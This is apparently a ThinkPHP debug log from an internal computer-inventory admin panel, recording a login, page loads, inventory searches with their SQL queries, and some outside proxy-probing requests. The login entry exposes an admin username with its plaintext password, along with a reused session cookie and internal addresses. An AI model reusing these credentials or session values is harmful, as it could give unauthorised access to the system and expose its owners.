  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/loginaction_html' => '',
  'username' => 'it02',
  'password' => 'loevluma',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.555815s ] mysql:host=127.0.0.1;dbname=compmgmt;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `admin` [ RunTime:0.389928s ]
[ sql ] [ SQL ] SELECT * FROM `admin` WHERE  `username` = 'it02' LIMIT 1 [ RunTime:0.056680s ]
[ sql ] [ SQL ] UPDATE `admin`  SET `lastip` = '192.168.10.58' , `lastvisit` = '1641277344'  WHERE  `id` = 17 [ RunTime:0.003002s ]
---------------------------------------------------------------
[ 2022-01-04T14:22:25+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/padmin/index/index.html
[运行时间：0.041903s] [吞吐率：23.86req/s] [内存消耗：500.91kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'referer' => 'http://pcadmin.aoi.bj/padmin/adminlogin/index.html',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
  '/padmin/index/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/index.html [ array (
  0 => 'PAdmin',
  1 => 'data',
  2 => 'msg',
) ]
---------------------------------------------------------------
[ 2022-01-04T14:22:26+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/static/padmin/css/font-awesome.css
[运行时间：0.003918s] [吞吐率：255.24req/s] [内存消耗：468.95kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/css,*/*;q=0.1',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'referer' => 'http://pcadmin.aoi.bj/static/padmin/css/style.css',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
)
[ info ] [ PARAM ] array (
  '/static/padmin/css/font-awesome_css' => '',
)
---------------------------------------------------------------
[ 2022-01-04T14:22:26+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/static/padmin/css/animate.css
[运行时间：0.003993s] [吞吐率：250.45req/s] [内存消耗：468.92kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/css,*/*;q=0.1',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'referer' => 'http://pcadmin.aoi.bj/static/padmin/css/style.css',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
)
[ info ] [ PARAM ] array (
  '/static/padmin/css/animate_css' => '',
)
---------------------------------------------------------------
[ 2022-01-04T14:22:26+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/padmin/index/computer.html
[运行时间：0.196174s] [吞吐率：5.10req/s] [内存消耗：736.55kb] [文件加载：80]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'referer' => 'http://pcadmin.aoi.bj/padmin/index/index.html',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
  '/padmin/index/computer_html' => '',
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/computer.html [ array (
  0 => 'PAdmin',
  1 => 'internetAccess',
) ]
[ sql ] [ DB ] CONNECT:[ UseTime:0.084446s ] mysql:host=127.0.0.1;dbname=compmgmt;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `internet_access` [ RunTime:0.086455s ]
[ sql ] [ SQL ] SELECT * FROM `internet_access` WHERE  `disabled` = 0 [ RunTime:0.000411s ]
---------------------------------------------------------------
[ 2022-01-04T14:22:26+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/static/padmin/css/font-awesome.css
[运行时间：0.002867s] [吞吐率：348.80req/s] [内存消耗：468.95kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/css,*/*;q=0.1',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'referer' => 'http://pcadmin.aoi.bj/static/padmin/css/style.css',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
)
[ info ] [ PARAM ] array (
  '/static/padmin/css/font-awesome_css' => '',
)
---------------------------------------------------------------
[ 2022-01-04T14:22:26+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/static/padmin/css/animate.css
[运行时间：0.002897s] [吞吐率：345.21req/s] [内存消耗：468.92kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/css,*/*;q=0.1',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'referer' => 'http://pcadmin.aoi.bj/static/padmin/css/style.css',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
)
[ info ] [ PARAM ] array (
  '/static/padmin/css/animate_css' => '',
)
---------------------------------------------------------------
[ 2022-01-04T14:22:26+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/padmin/index/getcomplist.html?page=1&limit=20&keyword=
[运行时间：0.161364s] [吞吐率：6.20req/s] [内存消耗：934.91kb] [文件加载：90]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'x-requested-with' => 'XMLHttpRequest',
  'connection' => 'keep-alive',
  'referer' => 'http://pcadmin.aoi.bj/padmin/index/computer.html',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
)
[ info ] [ PARAM ] array (
  '/padmin/index/getcomplist_html' => '',
  'page' => '1',
  'limit' => '20',
  'keyword' => '',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000678s ] mysql:host=127.0.0.1;dbname=compmgmt;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `computer` [ RunTime:0.002340s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `computer` `c` LEFT JOIN `department` `d` ON `d`.`id`=`c`.`department_id` LEFT JOIN `staff` `s` ON `s`.`id`=`c`.`staff_id` WHERE  `d`.`name` LIKE '%%'  OR `s`.`name` LIKE '%%'  OR `c`.`FQDN` LIKE '%%'  OR `c`.`asset_id` LIKE '%%'  OR `c`.`MAC` LIKE '%%'  OR `c`.`ip_addr_v4` LIKE '%%'  OR `c`.`domain_name` LIKE '%%' LIMIT 1 [ RunTime:0.034534s ]
[ sql ] [ SQL ] SELECT `c`.*,d.name as department,s.name as staff FROM `computer` `c` LEFT JOIN `department` `d` ON `d`.`id`=`c`.`department_id` LEFT JOIN `staff` `s` ON `s`.`id`=`c`.`staff_id` WHERE  `d`.`name` LIKE '%%'  OR `s`.`name` LIKE '%%'  OR `c`.`FQDN` LIKE '%%'  OR `c`.`asset_id` LIKE '%%'  OR `c`.`MAC` LIKE '%%'  OR `c`.`ip_addr_v4` LIKE '%%'  OR `c`.`domain_name` LIKE '%%' LIMIT 0,20 [ RunTime:0.000569s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `os` [ RunTime:0.012015s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 6 LIMIT 1 [ RunTime:0.000329s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `computer_internet_access` [ RunTime:0.005119s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 1 [ RunTime:0.000290s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000334s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 2 [ RunTime:0.000303s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000267s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 4 [ RunTime:0.000252s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000254s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 5 [ RunTime:0.000209s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000558s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 7 [ RunTime:0.000191s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000189s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 8 [ RunTime:0.000188s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000180s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 9 [ RunTime:0.000190s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000476s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 10 [ RunTime:0.000209s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000186s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 11 [ RunTime:0.000186s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000183s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 12 [ RunTime:0.000185s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000181s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 13 [ RunTime:0.000177s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000236s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 14 [ RunTime:0.000238s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000300s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 15 [ RunTime:0.000366s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 11 LIMIT 1 [ RunTime:0.000333s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 16 [ RunTime:0.000273s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000268s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 17 [ RunTime:0.000282s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000267s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 18 [ RunTime:0.000216s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000202s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 20 [ RunTime:0.000185s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000607s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 21 [ RunTime:0.000294s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000261s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 22 [ RunTime:0.000246s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 10 LIMIT 1 [ RunTime:0.000246s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 23 [ RunTime:0.000243s ]
---------------------------------------------------------------
[ 2022-01-04T14:22:31+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/padmin/index/getcomplist.html?page=1&limit=20&keyword=cg04
[运行时间：0.071118s] [吞吐率：14.06req/s] [内存消耗：847.19kb] [文件加载：90]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'x-requested-with' => 'XMLHttpRequest',
  'connection' => 'keep-alive',
  'referer' => 'http://pcadmin.aoi.bj/padmin/index/computer.html',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
)
[ info ] [ PARAM ] array (
  '/padmin/index/getcomplist_html' => '',
  'page' => '1',
  'limit' => '20',
  'keyword' => 'cg04',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.001064s ] mysql:host=127.0.0.1;dbname=compmgmt;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `computer` [ RunTime:0.001151s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `computer` `c` LEFT JOIN `department` `d` ON `d`.`id`=`c`.`department_id` LEFT JOIN `staff` `s` ON `s`.`id`=`c`.`staff_id` WHERE  `d`.`name` LIKE '%cg04%'  OR `s`.`name` LIKE '%cg04%'  OR `c`.`FQDN` LIKE '%cg04%'  OR `c`.`asset_id` LIKE '%cg04%'  OR `c`.`MAC` LIKE '%cg04%'  OR `c`.`ip_addr_v4` LIKE '%cg04%'  OR `c`.`domain_name` LIKE '%cg04%' LIMIT 1 [ RunTime:0.060392s ]
[ sql ] [ SQL ] SELECT `c`.*,d.name as department,s.name as staff FROM `computer` `c` LEFT JOIN `department` `d` ON `d`.`id`=`c`.`department_id` LEFT JOIN `staff` `s` ON `s`.`id`=`c`.`staff_id` WHERE  `d`.`name` LIKE '%cg04%'  OR `s`.`name` LIKE '%cg04%'  OR `c`.`FQDN` LIKE '%cg04%'  OR `c`.`asset_id` LIKE '%cg04%'  OR `c`.`MAC` LIKE '%cg04%'  OR `c`.`ip_addr_v4` LIKE '%cg04%'  OR `c`.`domain_name` LIKE '%cg04%' LIMIT 0,20 [ RunTime:0.001249s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `os` [ RunTime:0.001058s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000286s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `computer_internet_access` [ RunTime:0.000867s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 31 [ RunTime:0.000506s ]
---------------------------------------------------------------
[ 2022-01-04T14:39:19+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/padmin/index/getcomplist.html?page=1&limit=20&keyword=mg03
[运行时间：0.523511s] [吞吐率：1.91req/s] [内存消耗：1,246.65kb] [文件加载：90]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'x-requested-with' => 'XMLHttpRequest',
  'connection' => 'keep-alive',
  'referer' => 'http://pcadmin.aoi.bj/padmin/index/computer.html',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
)
[ info ] [ PARAM ] array (
  '/padmin/index/getcomplist_html' => '',
  'page' => '1',
  'limit' => '20',
  'keyword' => 'mg03',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.015624s ] mysql:host=127.0.0.1;dbname=compmgmt;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `computer` [ RunTime:0.002517s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `computer` `c` LEFT JOIN `department` `d` ON `d`.`id`=`c`.`department_id` LEFT JOIN `staff` `s` ON `s`.`id`=`c`.`staff_id` WHERE  `d`.`name` LIKE '%mg03%'  OR `s`.`name` LIKE '%mg03%'  OR `c`.`FQDN` LIKE '%mg03%'  OR `c`.`asset_id` LIKE '%mg03%'  OR `c`.`MAC` LIKE '%mg03%'  OR `c`.`ip_addr_v4` LIKE '%mg03%'  OR `c`.`domain_name` LIKE '%mg03%' LIMIT 1 [ RunTime:0.001082s ]
[ sql ] [ SQL ] SELECT `c`.*,d.name as department,s.name as staff FROM `computer` `c` LEFT JOIN `department` `d` ON `d`.`id`=`c`.`department_id` LEFT JOIN `staff` `s` ON `s`.`id`=`c`.`staff_id` WHERE  `d`.`name` LIKE '%mg03%'  OR `s`.`name` LIKE '%mg03%'  OR `c`.`FQDN` LIKE '%mg03%'  OR `c`.`asset_id` LIKE '%mg03%'  OR `c`.`MAC` LIKE '%mg03%'  OR `c`.`ip_addr_v4` LIKE '%mg03%'  OR `c`.`domain_name` LIKE '%mg03%' LIMIT 0,20 [ RunTime:0.013689s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `os` [ RunTime:0.001279s ]
[ sql ] [ SQL ] SELECT `name`,`version`,`arch` FROM `os` WHERE  `id` = 3 LIMIT 1 [ RunTime:0.000421s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `computer_internet_access` [ RunTime:0.001592s ]
[ sql ] [ SQL ] SELECT `access_id` FROM `computer_internet_access` WHERE  `computer_id` = 4 [ RunTime:0.000335s ]
---------------------------------------------------------------
[ 2022-01-04T15:02:46+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.209344s] [吞吐率：4.78req/s] [内存消耗：491.08kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T15:02:47+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.042430s] [吞吐率：23.57req/s] [内存消耗：487.80kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T16:02:52+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.011242s] [吞吐率：88.95req/s] [内存消耗：489.88kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T16:02:52+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.007447s] [吞吐率：134.28req/s] [内存消耗：486.59kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T16:24:01+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/padmin/index/staffinfo.html?id=6
[运行时间：0.004547s] [吞吐率：219.92req/s] [内存消耗：498.80kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'referer' => 'http://pcadmin.aoi.bj/padmin/index/computer.html',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
  '/padmin/index/staffinfo_html' => '',
  'id' => '6',
)
---------------------------------------------------------------
[ 2022-01-04T16:24:01+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/padmin/adminlogin/index.html
[运行时间：0.007453s] [吞吐率：134.17req/s] [内存消耗：488.58kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://pcadmin.aoi.bj/padmin/index/computer.html',
  'connection' => 'keep-alive',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T16:24:02+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/padmin/adminlogin/index.html
[运行时间：0.003769s] [吞吐率：265.33req/s] [内存消耗：487.68kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'referer' => 'http://pcadmin.aoi.bj/padmin/adminlogin/index.html',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T16:24:03+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/padmin/adminlogin/index.html
[运行时间：0.007498s] [吞吐率：133.37req/s] [内存消耗：488.66kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://pcadmin.aoi.bj/padmin/adminlogin/index.html',
